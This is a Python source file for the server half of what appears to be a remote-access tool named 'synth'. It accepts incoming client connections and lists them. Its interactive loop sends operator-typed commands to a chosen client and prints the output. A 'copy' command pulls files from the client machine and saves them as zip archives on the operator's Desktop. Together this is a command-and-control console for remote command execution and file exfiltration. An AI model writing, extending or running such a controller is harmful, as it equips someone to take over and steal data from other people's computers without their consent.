import os
import click
from uuid import uuid4
from tqdm import tqdm
from typing import List
from socket import SO_REUSEADDR, socket, AF_INET, SOCK_STREAM, SOL_SOCKET, timeout

from synth.types.Address import Address
from synth.types.Connection import Connection

class Server:
    def __init__(self, host: str, port: int, size: int = 1024) -> None:
        self.host: str = host
        self.port: int = port
        self.size: int = size
        self.max_con: int = 128

        self.socket: socket = socket(AF_INET, SOCK_STREAM)
        self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, True)

        self.socket.bind((self.host, self.port))
        self.socket.settimeout(5)
        self.socket.listen(self.max_con)

        self.clients: List[Connection] = []
        self.exit_flag = False
        pass
    

    def _ping(self, client: socket) -> bool:
        try:
            return client.send(b'--Ping')
        except:
            return False
    

    def listen(self) -> None:
        while not self.exit_flag:
            try:
                c, a = self.socket.accept()
                
                if c:
                    address = Address(a[0], int(a[1]))
                    self.clients.append(Connection(c, address))
                else:
                    click.echo(f'Unable to create connection.')
            except timeout:
                continue
        

    def show_clients(self) -> None:
        click.echo(click.style("\n\tAddress\t\tPort", fg="red"))

        try:
            for i in range(0, len(self.clients)):
                if not self._ping(self.clients[i].client):
                    self.clients[i].client.close()
                    self.clients.remove(self.clients[i])
                
                click.echo(f'{i} | \t{self.clients[i].address.host}\t{self.clients[i].address.port}')
                    
        except:
            pass

        finally:
            click.echo("\n\n")
        
        pass


    def send_commands(self, connection: Connection) -> None:
        client: socket = connection.client
        
        while True:
            cmd = input(f'{connection.address.host} » ') or " "
            
            client.send(cmd.encode())

            if cmd == 'quit' or cmd == 'close':
                break

            if cmd.startswith("copy "):
                downloads_path: str = os.path.abspath(os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop') + "/" + "synthdownloads")

                try:
                    os.mkdir(downloads_path)
                except:
                    pass

                # receive the file infos
                # receive using client socket, not server socket
                filesize = client.recv(self.size)

                # convert to integer
                filesize = int(filesize)

                filename = uuid4().hex

                progress = tqdm(range(filesize), unit="B", unit_scale=True, unit_divisor=1024, ascii=True)
                with open(f'{downloads_path}/{filename}.zip', "wb") as f:
                    while True:
                        bytes_read = client.recv(self.size)
                        

                        if not bytes_read:
                            break
                        # write to the file the bytes we just received
                        f.write(bytes_read)
                        # update the progress bar
                        progress.update(len(bytes_read))
                break
            
            response: bytes = client.recv(self.size)

            if response:
                out: str = ""

                try:
                    out = response.decode("utf-8")
                except:
                    pass
                finally:
                    click.echo(f'{connection.address.host} « {out}')
        pass


    def kill(self) -> None:
        self.exit_flag = True
        
        for conn in self.clients:
            if self._ping(conn.client):
                conn.client.close()
        pass